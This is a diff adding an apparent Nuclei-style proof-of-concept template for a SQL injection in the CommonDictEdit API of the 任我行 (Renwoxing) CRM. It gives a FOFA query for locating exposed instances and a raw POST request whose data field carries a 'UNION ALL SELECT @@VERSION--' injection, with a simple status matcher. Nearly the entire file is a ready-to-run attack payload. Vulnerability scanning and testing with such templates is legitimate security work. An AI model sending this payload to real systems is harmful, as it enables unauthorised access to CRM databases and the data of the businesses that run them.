@@ -1,0 +1,36 @@
+id: poc-4283072727
+info:
+  name: 任我行协同CRM普及版 CommonDictEdit SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="任我行-CRM"
+http:
+- raw:
+  - 'POST /crm/api/OpenApi/CommonDict/Edit?accesstoken=1&accesskey=1×tamp=1&nonce=1&signature=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    enumType=69&data={"ID":"1","Name":"''+UNION+ALL+SELECT+@@VERSION--"}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
